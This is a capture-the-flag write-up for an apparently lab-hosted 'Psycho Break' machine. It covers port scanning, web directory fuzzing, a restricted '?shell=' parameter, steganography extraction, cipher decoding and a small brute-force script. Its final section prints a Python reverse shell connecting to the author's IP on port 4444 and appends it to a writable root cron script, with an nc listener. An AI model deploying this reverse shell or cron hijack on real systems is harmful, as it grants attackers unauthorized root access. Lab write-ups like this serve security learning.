# Psycho Break Write-up: Easy

## Nmap

```
nmap -sC -sV <ip> -p-
```

Open ports:
- 21: ftp. ProFTPD 1.3.5a
- 22: ssh. OpenSSH 7.2p2 Ubuntu
- 80: http. Apache httpd 2.4.18

None of the versions appear to be vulnerable.

## HTTP

Viewing the source on port 80's home page revealed a directory **/sadistRoom**.
This displayed the first key for the locker room.

The locker room page says decode the text: *Tizmg_nv_zxxvhh_gl_gsv_nzk_kovzhv*. This is the *atbash* cipher, revealing the second map key after inputting the decoded key.

Entering this key into /map.php reveals links to all 4 rooms, so let's check out the final two.

### Safe Haven

The source code contains the comment *I think I'm having a terrible nightmare. Search through me and find it ...*

Using fuzzing tools with a standard wordlist didn't find anything, so I used cewl to generate a custom wordlist based on the link given in the page source of the first room:

```
cewl -url https://theevilwithin.fandom.com/wiki/Sadist > words.txt

gobuster fuzz -u http://<ip>/SafeHeaven//FUZZ -w words.txt -k --exclude-length 273
```

This quickly found the */keeper* directory. It then gives you 1m45s to find the real location of the given image. Quickly navigating to *https://tineye.com/* and uploading the image found some original sources with the location listed, although I had to re-format it to match the page's. This gave me the keeper key.

### The Abandonded Room

The page source of this room gives a hint about a *shell*, so I tried to add it as a parameter:
```
?shell=<command>
```

It is a very limited shell as most commands result in *Command not permitted!*, but the **ls** command worked, so I had a look around the filesystem. The parent directory (..) contained two interesting directories, one of which was the current directory name, so I replaced that in the url with the other one.

This let me escape from Laura! This new directory contained a .txt file congratulating me, as well as a *helpme.zip*. Unzipping revealed the helpme.txt and Table.jpg files. 

helpme.txt:
```
From Joseph,

Who ever sees this message "HELP Me". Ruvik locked me up in this cell. Get the key on the table and unlock this cell. I'll tell you what happened when I am out of this cell.
```

Using Binwalk found there were some embedded files within the Table.jpg file, as it returned *key.wav* and *Joseph_Oda.jpg*. Running unzip again retrieved these 2 files.

## Audacity & FTP

Loading key.wav into Audacity shows a sequence of shorter and longer beeps separated by even longer gaps: *morse code!* Translating it reveals the passphrase **showme**. Using this key in the upper case let's us extract a final text file from Joseph_Oda.jpg.

```
steghide extract -sf Joseph_Oda.jpg
```

This generated thankyou.txt with some ftp credentials for the *joseph* user.
```
ftp <ip>
```

On the ftp server, there were two files, a program and a dictionary list called random.dic, so I downloaded those.

## Python script to find the keyword

Program takes a word as an argument and outputs either 'Incorrect' or 'Correct'. I wrote a short python script to run the program with each of the keywords in the list, and output the word that caused 'Correct' to appear in the list.

```
import subprocess
import sys

wordlist = sys.argv[1]
program = sys.argv[2]

with open(wordlist, 'r') as file:
    for line in file:
        line = line.strip()
        output = subprocess.check_output([program, line])
        output = output.decode('utf-8').strip()
        if "Correct" in output:
            print("Keyword found: " + line)
            break
```

Then, run the program with:
```
python3 script.py random.dic ./program
```

This found the keyword **kidman**. Supplying this argument to the program outputs this:
```
Well Done !!!
Decode This => 55 444 3 6 2 66 7777 7 2 7777 7777 9 666 777 3 444 7777 7777 666 7777 8 777 2 66 4 33
```

Because there is a maximum of 4 numbers supplied, I guessed this was a *tap phone cipher*, and I was right. The decoded message is the password to ssh for the *kidman* user.

## SSH & Privilege Escalation

```
ssh kidman@<ip>
```

The first flag was found in the user's home directory as usual.
I found an interesting cronjob being run by root: **python3 /var/.the_eye_of_ruvik.py**. Since this script is writeable, I just added to the end a python reverse shell back to my machine to get root :)

```
import socket, subprocess, os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<my_ip>",4444))
os.dup2(s.fileno(),0) 
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty 
pty.spawn("/bin/bash")
```

Then, setup the listener with **nc -lvnp 4444** and wait for the cronjob to run!
The root flag was found in the /root directory as usual :)

This challenge was so fun! Not particularly difficult, but had a lot of enjoyable elements like the morse code in the .wav file and the custom brute force script.
